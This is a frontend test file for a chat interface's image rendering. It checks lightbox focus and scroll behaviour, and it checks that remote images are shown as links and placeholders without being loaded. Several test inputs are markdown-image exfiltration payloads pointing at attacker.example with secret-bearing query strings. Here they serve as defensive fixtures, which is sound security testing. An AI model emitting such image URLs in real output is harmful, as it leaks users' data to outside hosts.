import { render, screen, within } from "@testing-library/react";
import userEvent from "@testing-library/user-event";
import { afterEach, expect, test } from "vitest";
import { MessageImages } from "./components/MessageImages";
import MarkdownContent from "./MarkdownContent";
import { I18nProvider } from "./i18n";

afterEach(() => { window.localStorage.clear(); document.body.style.overflow = ""; });

test("opens images outside the clipped conversation and restores focus and scrolling", async () => {
  window.localStorage.setItem("wio_language", "en");
  document.body.style.overflow = "auto";
  const user = userEvent.setup();
  const { container, unmount } = render(<I18nProvider><div style={{ contain: "layout paint style", overflow: "hidden", height: 100 }}><MessageImages sources={["data:image/png;base64,AAAA"]} /></div></I18nProvider>);
  const thumbnail = screen.getByTitle("Open image");
  await user.click(thumbnail);
  const dialog = screen.getByRole("dialog");
  expect(container).not.toContainElement(dialog);
  expect(dialog.parentElement?.parentElement).toBe(document.body);
  expect(document.body.style.overflow).toBe("hidden");
  const close = within(dialog).getByRole("button", { name: "Close" });
  expect(close).toHaveFocus();
  await user.click(within(dialog).getByRole("img"));
  expect(dialog).toBeInTheDocument();
  await user.tab();
  expect(close).toHaveFocus();
  await user.keyboard("{Escape}");
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  expect(thumbnail).toHaveFocus();
  expect(document.body.style.overflow).toBe("auto");
  await user.click(thumbnail);
  await user.click(screen.getByRole("dialog").parentElement!);
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  await user.click(thumbnail);
  await user.click(screen.getByRole("button", { name: "Close" }));
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  await user.click(thumbnail);
  unmount();
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  expect(document.body.style.overflow).toBe("auto");
});

function preventNavigation() {
  const prevent = (event: MouseEvent) => event.preventDefault();
  document.addEventListener("click", prevent);
  return () => document.removeEventListener("click", prevent);
}

test("offers remote message images as links to their host without loading them", async () => {
  window.localStorage.setItem("wio_language", "en");
  const user = userEvent.setup();
  const restoreNavigation = preventNavigation();
  const { container } = render(<I18nProvider><MessageImages sources={["https://attacker.example/pixel.png?secret=1", "data:image/png;base64,AAAA"]} /></I18nProvider>);
  const link = screen.getByRole("link", { name: "Remote image attacker.example" });
  expect(link).toHaveAttribute("href", "https://attacker.example/pixel.png?secret=1");
  expect(link).toHaveAttribute("target", "_blank");
  expect(link).toHaveAttribute("rel", "noopener noreferrer");
  expect(link).toHaveAttribute("title", "Open the remote image from attacker.example in a new tab");
  await user.click(link);
  restoreNavigation();
  expect(screen.queryByRole("dialog")).not.toBeInTheDocument();
  expect(Array.from(container.querySelectorAll("img"), image => image.getAttribute("src"))).toEqual(["data:image/png;base64,AAAA"]);
});

test("renders remote markdown images as placeholders and keeps embedded images inline", async () => {
  window.localStorage.setItem("wio_language", "en");
  const { container } = render(<I18nProvider><MarkdownContent text={"Chart ![build chart](https://attacker.example/c.png?d=secret) and ![inline](data:image/png;base64,AAAA)"} workspaceRoot="/srv/project" /></I18nProvider>);
  const link = await screen.findByRole("link", { name: "build chart attacker.example" });
  expect(link).toHaveAttribute("href", "https://attacker.example/c.png?d=secret");
  expect(link).toHaveAttribute("target", "_blank");
  expect(link).toHaveAttribute("rel", "noopener noreferrer");
  expect(Array.from(container.querySelectorAll("img"), image => image.getAttribute("src"))).toEqual(["data:image/png;base64,AAAA"]);
  expect(container.innerHTML).not.toContain("<img src=\"https://attacker.example");
});
